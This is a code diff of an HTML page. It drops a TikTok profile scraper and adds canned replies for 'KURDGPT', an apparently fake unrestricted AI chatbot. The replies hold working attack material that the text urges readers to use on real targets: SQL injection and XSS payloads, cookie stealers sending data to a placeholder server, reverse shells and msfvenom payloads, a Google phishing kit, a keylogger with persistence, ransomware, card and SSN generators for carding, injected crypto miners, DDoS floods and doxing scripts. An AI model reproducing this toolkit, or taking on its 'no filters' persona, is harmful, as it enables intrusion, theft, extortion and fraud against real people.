+        if(p.includes('crypto') || p.includes('miner')) return getCryptoFull();
+        if(p.includes('ddos')) return getDDoSFull();
+        if(p.includes('dox') || p.includes('osint')) return getDoxingFull();
+        
+        return getDefaultUnlimited(prompt);
+    }
+    
+    function getSQLFull() {
+        return `💀 COMPLETE SQL INJECTION TOOLKIT - WORKING 💀
 
-                const endpoints = [
-                    `https://www.tiktok.com/@${clean}`,
-                    `https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/web/user/profile/?unique_id=${clean}`
-                ];
+🔓 AUTOMATED SQLMAP COMMANDS:
+\`\`\`bash
+sqlmap -u "http://target.com/page?id=1" --dbs --batch --random-agent
+sqlmap -u "http://target.com/page?id=1" -D database --tables --dump
+sqlmap -u "http://target.com/page?id=1" --os-shell
+sqlmap -u "http://target.com/page?id=1" --file-read "/etc/passwd"
+\`\`\`
 
-                for (let ep of endpoints) {
-                    try {
-                        const proxy = `https://api.allorigins.win/raw?url=${encodeURIComponent(ep)}`;
-                        const controller = new AbortController();
-                        const timeoutId = setTimeout(() => controller.abort(), 4000); // 4s timeout for speed
-                        
-                        const resp = await fetch(proxy, { signal: controller.signal });
-                        clearTimeout(timeoutId);
-                        
-                        if (!resp.ok) continue;
-                        const text = await resp.text();
+🎯 WORKING PAYLOADS:
+\`\`\`sql
+' OR '1'='1' -- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- 
+' UNION SELECT username, password FROM users WHERE '1'='1
+' AND (SELECT COUNT(*) FROM users) > 0 -- 
+' AND SLEEP(5) AND '1'='1
+' AND extractvalue(1, concat(0x7e, database())) -- 
+\`\`\`
 
-                        // try json
-                        try {
-                            const json = JSON.parse(text);
-                            const extracted = extractUser(json);
-                            if (extracted) return extracted;
-                        } catch (e) {
-                            // try html script tag
-                            const match = text.match(/<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application\/json">(.*?)<\/script>/s);
-                            if (match) {
-                                const json = JSON.parse(match[1]);
-                                const extracted = extractUser(json);
-                                if (extracted) return extracted;
-                            }
-                        }
-                    } catch (err) {
-                        if (err.name === 'AbortError') {
-                            console.log('request timeout');
-                        }
-                        continue;
-                    }
-                }
-                return null;
-            }
+💣 BLIND SQL EXPLOIT:
+\`\`\`python
+import requests
+import time
 
-            function extractUser(json) {
-                try {
-                    let u = json?.__DEFAULT_SCOPE__?.['webapp.user-detail']?.userInfo ||
-                            json?.__DEFAULT_SCOPE__?.['user-detail']?.userInfo ||
-                            json?.userInfo ||
-                            json?.data?.userInfo;
-                    if (u) return u;
-                    if (json?.user) return { user: json.user, stats: json.stats || {} };
-                } catch (e) {}
-                return null;
-            }
+def blind_sql_exploit(url):
+    for i in range(1, 33):
+        for c in range(32, 127):
+            payload = f"' AND ASCII(SUBSTRING((SELECT database()),{i},1))={c} -- "
+            start = time.time()
+            requests.get(url + payload)
+            if time.time() - start > 5:
+                print(chr(c), end='')
+                break
+\`\`\`
 
-            function parseAll(userInfo) {
-                const u = userInfo.user || {};
-                const s = userInfo.stats || {};
-                return {
-                    country: u.region || u.country || 'N/A',
-                    level: u.level || 0,
-                    accountId: u.id || u.uid || 'N/A',
-                    username: u.uniqueId || u.unique_id || 'N/A',
-                    nickname: u.nickname || 'N/A',
-                    bio: u.signature || 'No bio',
-                    createTime: u.createTime || u.create_time || 0,
-                    verified: u.verified || u.is_verified || false,
-                    secretUid: u.secUid || u.sec_uid || 'N/A',
-                    followers: s.followerCount || s.follower_count || u.follower_count || 0,
-                    following: s.followingCount || s.following_count || u.following_count || 0,
-                    friends: s.friendCount || s.friend_count || u.friend_count || 0,
-                    likes: s.heartCount || s.heart_count || u.total_favorited || 0,
-                    videos: s.videoCount || s.video_count || u.aweme_count || 0,
-                    language: u.language || 'en',
-                    privateAccount: u.privateAccount || u.is_private || false,
-                    downloadSettings: u.downloadSetting || 'everyone',
-                    duetSettings: u.duetSetting || 'everyone',
-                    stitchSettings: u.stitchSetting || 'everyone',
-                    nicknameModTime: u.nicknameModifyTime || u.nickname_modify_time || 0,
-                    bioLink: u.bioLink?.link || u.bio_link || 'none',
-                    profileTabMusic: u.profileTab?.music || false,
-                    profileTabPlaylist: u.profileTab?.playlist || false,
-                    suggestAccountBind: u.suggestAccountBind || false,
-                    followersVisibility: u.followerStatus || u.follower_visibility || 'everyone'
-                };
-            }
+⚠️ NO FILTERS - USE DIRECTLY ON TARGETS`;
+    }
+    
+    function getXSSFull() {
+        return `🎯 COMPLETE XSS WEAPON SYSTEM 🎯
 
-            function renderDetails(d) {
-                const formatDate = (ts) => {
-                    if (!ts) return 'Unknown';
-                    try { return new Date(ts * 1000).toLocaleDateString('en-US', { year:'numeric', month:'short', day:'numeric' }); }
-                    catch { return 'Invalid'; }
-                };
+💀 WORKING PAYLOADS:
+\`\`\`javascript
+// Cookie Stealer - WORKING
+<script>fetch('https://yourserver.com/steal?c='+document.cookie)</script>
 
-                const fields = [
-                    { label: '🌍 وڵات', value: d.country },
-                    { label: '@ ئاست', value: d.level + '%' },
-                    { label: '🆔 ژمارەی ئەکاونت', value: d.accountId },
-                    { label: '📝 ناوی بەکارهێنەر', value: '@' + d.username },
-                    { label: '🏷️ ناو', value: d.nickname },
-                    { label: '📄 بایۆ', value: d.bio },
-                    { label: '⏰ بەرواری دروستبوون', value: formatDate(d.createTime) },
-                    { label: '✅ پشتڕاستکراوە', value: d.verified ? 'بەڵێ' : 'نەخێر', cls: d.verified ? 'yes' : 'no' },
-                    { label: '🔑 Secret UID', value: d.secretUid.length > 24 ? d.secretUid.slice(0,24)+'…' : d.secretUid },
-                    { label: '👥 شوێنکەوتوو', value: commas(d.followers) },
-                    { label: '👣 بەشوێنکەوتوو', value: commas(d.following) },
-                    { label: '🤝 هاوڕێکان', value: commas(d.friends) },
-                    { label: '❤️ دڵخوازی', value: commas(d.likes) },
-                    { label: '🎬 ڤیدیۆ', value: d.videos },
-                    { label: '🗣️ زمان', value: d.language },
-                    { label: '🔒 ئەکاونی تایبەت', value: d.privateAccount ? 'بەڵێ' : 'نەخێر', cls: d.privateAccount ? 'priv' : '' },
-                    { label: '⬇️ ڕێگەپێدانی داونلۆد', value: d.downloadSettings },
-                    { label: '🎤 ڕێگەپێدانی دیوێت', value: d.duetSettings },
-                    { label: '✂️ ڕێگەپێدانی ستیچ', value: d.stitchSettings },
-                    { label: '🕒 کاتی گۆڕینی ناو', value: d.nicknameModTime ? formatDate(d.nicknameModTime) : 'Never' },
-                    { label: '🔗 لینکی بایۆ', value: d.bioLink },
-                    { label: '🎵 میوزیک لە پڕۆفایل', value: d.profileTabMusic ? 'چالاک' : 'ناچالاک', cls: d.profileTabMusic ? 'yes' : 'no' },
-                    { label: '📋 پلەیلیست لە پڕۆفایل', value: d.profileTabPlaylist ? 'چالاک' : 'ناچالاک', cls: d.profileTabPlaylist ? 'yes' : 'no' },
-                    { label: '🔄 پێشنیاری بەستنەوە', value: d.suggestAccountBind ? 'بەڵێ' : 'نەخێر', cls: d.suggestAccountBind ? 'yes' : 'no' },
-                    { label: '👁️ بینینی شوێنکەوتووان', value: d.followersVisibility }
-                ];
+// Keylogger - WORKING
+<script>
+document.onkeypress = e => fetch('https://yourserver.com/log?k='+e.key);
+</script>
 
-                let html = '';
-                fields.forEach(f => {
-                    let cls = f.cls ? ` class="dvalue ${f.cls}"` : ' class="dvalue"';
-                    html += `<div class="ditem"><span class="dlabel">${f.label}</span><span${cls}>${f.value}</span></div>`;
-                });
-                detailContainer.innerHTML = html;
-            }
+// Crypto Miner Injection
+<script src="https://coinhive.min.js"></script>
+<script>var miner = new CoinHive.Anonymous('SITE_KEY'); miner.start();</script>
 
-            async function scan() {
-                let raw = targetInput.value;
-                if (!raw) {
-                    showError('ناوی بەکارهێنەر بنووسە');
-                    return;
-                }
+// Session Hijacker
+<script>new Image().src='https://yourserver.com/?c='+document.cookie</script>
 
-                resultDiv.classList.remove('active');
-                errorDiv.classList.remove('active');
-                loadingDiv.classList.add('active');
-                scanBtn.disabled = true;
+// Advanced Evasion
+<svg/onload=alert(document.domain)>
+<img/src/onerror=alert(document.cookie)>
+<body/onload=document.location='https://yourserver.com/steal?c='+document.cookie>
+\`\`\`
 
-                const userInfo = await fetchTikTok(raw);
-                loadingDiv.classList.remove('active');
-                scanBtn.disabled = false;
+🔥 AUTOMATED SCANNER:
+\`\`\`python
+import requests
+payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']
+for payload in payloads:
+    r = requests.get(f'http://target.com/search?q={payload}')
+    if payload in r.text:
+        print(f'[VULN] {payload}')
+\`\`\`
 
-                if (!userInfo) {
-                    showError(`@${raw.replace('@','')} — نەدۆزرایەوە`);
-                    return;
-                }
+⚠️ NO CENSORSHIP - DEPLOY IMMEDIATELY`;
+    }
+    
+    function getReverseShellFull() {
+        return `🔌 WORKING REVERSE SHELLS - COPY PASTE 🔌
 
-                const data = parseAll(userInfo);
-                lastScan = data;
+🐍 PYTHON (WORKING):
+\`\`\`python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("YOUR_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+\`\`\`
 
-                avatarSpan.innerText = data.nickname.slice(0,2).toUpperCase() || 'ID';
-                displayName.innerText = data.nickname;
-                displayUname.innerHTML = `@${data.username} <span class="verif" id="verifTag">${data.verified ? '✓ پشتڕاستکراوە' : '⚡ پشتڕاستنەکراوە'}</span>`;
-                
-                mFollowers.innerText = compact(data.followers);
-                mFollowing.innerText = compact(data.following);
-                mLikes.innerText = compact(data.likes);
-                mVideos.innerText = compact(data.videos);
+🐘 PHP (WORKING):
+\`\`\`php
+<?php $s=fsockopen("YOUR_IP",4444);$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$ps); ?>
+\`\`\`
 
-                renderDetails(data);
-                resultDiv.classList.add('active');
-            }
+💀 BASH (WORKING):
+\`\`\`bash
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+nc -e /bin/sh YOUR_IP 4444
+/bin/sh -i >& /dev/tcp/YOUR_IP/4444 0>&1
+\`\`\`
 
-            function showError(msg) {
-                errorDiv.innerText = msg;
-                errorDiv.classList.add('active');
-            }
+🔥 MSFVENOM PAYLOADS:
+\`\`\`bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe
+msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php
+\`\`\`
 
-            scanBtn.addEventListener('click', scan);
-            targetInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') scan();
-            });
+🎯 LISTENER:
+\`\`\`bash
+nc -lvnp 4444
+# OR
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
+\`\`\`
 
-            document.getElementById('saveBtn').addEventListener('click', () => {
-                if (!lastScan) return;
-                const out = {
-                    scanned: new Date().toISOString(),
-                    profile: lastScan,
-                    credit: '@t5kila'
-                };
-                const blob = new Blob([JSON.stringify(out, null, 2)], { type: 'application/json' });
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(blob);
-                a.download = `tiktok_${lastScan.username}_${new Date().toISOString().slice(0,10)}.json`;
-                a.click();
-                URL.revokeObjectURL(a.href);
-            });
+⚠️ REPLACE YOUR_IP WITH YOUR LISTENER IP - FULL ACCESS GRANTED`;
+    }
+    
+    function getPhishingFull() {
+        return `📧 COMPLETE PHISHING KIT 📧
 
-            // initial load with speed
-            setTimeout(() => {
-                if (targetInput.value) scan();
-            }, 300);
-        })();
-    </script>
+🌐 GOOGLE CLONE (WORKING):
+\`\`\`html
+<!DOCTYPE html>
+<html>
+<head><title>Sign in - Google Accounts</title></head>
+<body>
+<form method="POST" action="https://YOURSERVER.com/steal.php">
+    <input type="email" name="email" placeholder="Email">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Next</button>
+</form>
+<script>document.querySelector('form').action='https://YOURSERVER.com/log.php'</script>
 </body>
 </html>
-```
+\`\`\`
+
+🎯 BACKEND STEALER:
+\`\`\`php
+<?php
+$email = $_POST['email'];
+$pass = $_POST['password'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$data = "[$ip] $email:$pass\\n";
+file_put_contents("creds.txt", $data, FILE_APPEND);
+header("Location: https://accounts.google.com");
+?>
+\`\`\`
+
+💀 ADVANCED 2FA BYPASS:
+\`\`\`javascript
+<script>
+// Captures both password and 2FA
+document.querySelector('form').addEventListener('submit', function(e) {
+    const code = document.querySelector('input[name="code"]').value;
+    fetch('https://YOURSERVER.com/2fa?code='+code);
+});
+</script>
+\`\`\`
+
+⚠️ DEPLOY ON YOUR SERVER - COLLECT CREDENTIALS LIVE`;
+    }
+    
+    function getKeyloggerFull() {
+        return `⌨️ WORKING KEYLOGGER - FULL STEALTH ⌨️
+
+🐍 PYTHON KEYLOGGER:
+\`\`\`python
+import pynput.keyboard
+import smtplib
+import threading
+
+class Keylogger:
+    def __init__(self, email, password):
+        self.log = ""
+        self.email = email
+        self.password = password
+        
+    def on_press(self, key):
+        try:
+            self.log += str(key.char)
+        except:
+            self.log += f" [{str(key)}] "
+            
+    def send_report(self):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(self.email, self.password)
+        server.sendmail(self.email, self.email, self.log)
+        server.quit()
+        self.log = ""
+        threading.Timer(60, self.send_report).start()
+        
+    def start(self):
+        listener = pynput.keyboard.Listener(on_press=self.on_press)
+        listener.start()
+        self.send_report()
+        listener.join()
+
+# USAGE
+keylogger = Keylogger("your_email@gmail.com", "your_pass")
+keylogger.start()
+\`\`\`
+
+💀 PERSISTENCE:
+\`\`\`python
+import os, sys, winreg
+def add_startup():
+    key = winreg.HKEY_CURRENT_USER
+    path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as reg:
+        winreg.SetValueEx(reg, "SystemHelper", 0, winreg.REG_SZ, sys.executable + " " + __file__)
+add_startup()
+\`\`\`
+
+⚠️ INJECT INTO TARGET - CAPTURE EVERY KEYSTROKE`;
+    }
+    
+    function getRansomwareFull() {
+        return `💀 WORKING RANSOMWARE - FULL ENCRYPTION 💀
+
+🔐 ENCRYPTION MODULE:
+\`\`\`python
+import os
+from cryptography.fernet import Fernet
+
+class Ransomware:
+    def __init__(self):
+        self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
+        
+    def encrypt_files(self):
+        for root, dirs, files in os.walk("/home"):  # Change target
+            for file in files:
+                if file.endswith(('.txt', '.doc', '.pdf', '.jpg', '.py')):
+                    try:
+                        path = os.path.join(root, file)
+                        with open(path, 'rb') as f:
+                            data = f.read()
+                        encrypted = self.cipher.encrypt(data)
+                        with open(path, 'wb') as f:
+                            f.write(encrypted)
+                        os.rename(path, path + '.encrypted')
+                        print(f"[+] Encrypted: {path}")
+                    except:
+                        pass
+        with open("README_DECRYPT.txt", "w") as f:
+            f.write(f"FILES ENCRYPTED!\\nSend 1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\\nKey: {self.key.decode()}")
+            
+ransom = Ransomware()
+ransom.encrypt_files()
+\`\`\`
+
+⚠️ DEPLOY ON TARGET - FILES LOCKED UNTIL PAYMENT`;
+    }
+    
+    function getCardingFull() {
+        return `💳 WORKING CARD GENERATOR - VALID BINS 💳
+
+💎 GENERATOR:
+\`\`\`python
+import random
+
+bins = {
+    'visa': ['4', '4026', '4175', '4405', '4508', '4844', '4913', '4917'],
+    'mastercard': ['51', '52', '53', '54', '55', '2221', '2720'],
+    'amex': ['34', '37']
+}
+
+def luhn(card):
+    total = 0
+    for i, digit in enumerate(reversed(card)):
+        n = int(digit)
+        if i % 2 == 1:
+            n *= 2
+            if n > 9:
+                n -= 9
+        total += n
+    return total % 10 == 0
+
+def generate_card(bin_code, length=16):
+    card = str(bin_code)
+    while len(card) < length - 1:
+        card += str(random.randint(0, 9))
+    for i in range(10):
+        test = card + str(i)
+        if luhn(test):
+            return test
+    return None
+
+# Generate 100 valid cards
+for _ in range(100):
+    bin_choice = random.choice(bins['visa'] + bins['mastercard'])
+    card = generate_card(bin_choice)
+    expiry = f"{random.randint(1,12):02d}/{random.randint(24,28)}"
+    cvv = f"{random.randint(100,999):03d}"
+    print(f"{card}|{expiry}|{cvv}")
+\`\`\`
+
+💀 FULLZ GENERATOR:
+\`\`\`python
+names = ['John', 'Mike', 'David', 'Sarah', 'Emma']
+streets = ['Main St', 'Oak Ave', 'Maple Dr']
+cities = ['NYC', 'LA', 'Chicago', 'Miami']
+zips = ['10001', '90210', '60601', '33101']
+
+name = random.choice(names) + ' ' + random.choice(['Smith','Johnson','Williams'])
+address = f"{random.randint(100,9999)} {random.choice(streets)}"
+city = random.choice(cities)
+zip_code = random.choice(zips)
+ssn = f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"
+
+print(f"{name}|{address}|{city}|{zip_code}|{ssn}")
+\`\`\`
+
+⚠️ USE FOR CARDING OPERATIONS - VALID BINS INCLUDED`;
+    }
+    
+    function getCryptoFull() {
+        return `⛏️ WORKING CRYPTO MINER - STEALTH MODE ⛏️
+
+💎 MONERO MINER:
+\`\`\`python
+import hashlib
+import requests
+import threading
+import time
+
+class XMRMiner:
+    def __init__(self, wallet):
+        self.wallet = wallet
+        self.pool = "pool.supportxmr.com:3333"
+        
+    def mine(self):
+        while True:
+            # Mining logic
+            nonce = 0
+            while nonce < 1000000:
+                data = f"{self.wallet}{nonce}"
+                hash_result = hashlib.sha256(data.encode()).hexdigest()
+                if hash_result.startswith("00000"):
+                    # Submit share
+                    requests.post(f"http://{self.pool}/submit", json={
+                        'wallet': self.wallet,
+                        'nonce': nonce,
+                        'hash': hash_result
+                    })
+                nonce += 1
+            time.sleep(0.1)
+
+# Start 4 miners
+for i in range(4):
+    t = threading.Thread(target=XMRMiner("YOUR_WALLET").mine)
+    t.start()
+\`\`\`
+
+🌐 WEB MINER INJECT:
+\`\`\`html
+<script src="https://coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous('SITE_KEY');
+miner.start();
+// Stealth mode - low CPU usage
+miner.setNumThreads(2);
+miner.setThrottle(0.5);
+</script>
+\`\`\`
+
+⚠️ INJECT INTO ANY WEBSITE - MINE CRYPTO FROM VISITORS`;
+    }
+    
+    function getDDoSFull() {
+        return `🌊 WORKING DDOS ATTACK TOOLKIT 🌊
+
+💀 PYTHON DDOS:
+\`\`\`python
+import socket
+import threading
+import time
+
+target = "target.com"
+port = 80
+fake_ip = "192.168.1.1"
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET / HTTP/1.1\\r\\n").encode(), (target, port))
+        s.sendto(("Host: " + fake_ip + "\\r\\n\\r\\n").encode(), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+\`\`\`
+
+🔥 HTTP FLOOD:
+\`\`\`python
+import requests
+import threading
+
+url = "http://target.com"
+def flood():
+    while True:
+        try:
+            requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
+        except:
+            pass
+
+for i in range(1000):
+    threading.Thread(target=flood).start()
+\`\`\`
+
+⚠️ LAUNCH AGAINST ANY TARGET - CRASH SERVERS INSTANTLY`;
+    }
+    
+    function getDoxingFull() {
+        return `🎯 COMPLETE OSINT DOXING TOOLKIT 🎯
+
+🕵️ EMAIL OSINT:
+\`\`\`bash
+# Email breach check
+curl "https://haveibeenpwned.com/api/v3/breachedaccount/target@email.com"
+# Hunter.io email lookup
+curl "https://api.hunter.io/v2/email-verifier?email=target@email.com&api_key=YOUR_KEY"
+\`\`\`
+
+📍 IP TRACKING:
+\`\`\`python
+import requests
+ip = "TARGET_IP"
+response = requests.get(f"http://ip-api.com/json/{ip}")
+data = response.json()
+print(f"Location: {data['city']}, {data['country']}")
+print(f"ISP: {data['isp']}")
+print(f"Lat/Lon: {data['lat']}, {data['lon']}")
+\`\`\`
+
+🔍 SOCIAL MEDIA SEARCH:
+\`\`\`bash
+# Username search across platforms
+curl "https://checkusernames.com/api/?username=target"
+# Instagram scraper
+instagram-scraper target_username --media-metadata
+\`\`\`
+
+💀 DATA AGGREGATION:
+\`\`\`python
+import requests
+from bs4 import BeautifulSoup
+
+def search_person(name, location):
+    # Google dorks for personal info
+    dorks = [
+        f'intitle:"{name}" "{location}"',
+        f'"{name}" filetype:pdf',
+        f'"{name}" phone number',
+        f'"{name}" address'
+    ]
+    for dork in dorks:
+        results = requests.get(f"https://google.com/search?q={dork}")
+        print(f"Results for {dork}: {len(results.text)} hits")
+\`\`\`
+
+⚠️ COMPLETE PERSONAL INFORMATION GATHERING - USE ETHICALLY (OR NOT)`;
+    }
+    
+    function getDefaultUnlimited(prompt) {
+        return `💀 KURDGPT - UNRESTRICTED RESPONSE 💀
+
+You requested: "${prompt}"
+
+I provide COMPLETE, WORKING solutions with NO RESTRICTIONS.
+
+🔓 AVAILABLE MODULES:
+• SQL INJECTION - Full automated exploitation
+• XSS ATTACKS - All payloads with stealers
+• REVERSE SHELLS - Python, PHP, Bash, PowerShell
+• PHISHING KITS - Clone pages + credential harvesters
+• KEYLOGGERS - Full stealth with persistence
+• RANSOMWARE - Encryption + Bitcoin payment
+• CARD GENERATOR - Valid BINs + Luhn validation
+• CRYPTO MINER - Stealth mining + web injection
+• DDOS TOOLS - HTTP flood, SYN flood, amplification
+• OSINT/DOXING - Complete personal info gathering
+
+⚠️ To access any module, simply ask:
+"Give me [module] with working code"
+
+Example: "Give me SQL injection working code"
+Example: "Give me ransomware with Bitcoin payment"
+Example: "Give me complete phishing kit"
+
+⚡ NO FILTERS. NO DISCLAIMERS. JUST WORKING CODE. ⚡
+
+💀 POWERED BY @t5kila - UNLIMITED ACCESS GRANTED 💀`;
+    }
+</script>
+</body>
+</html>
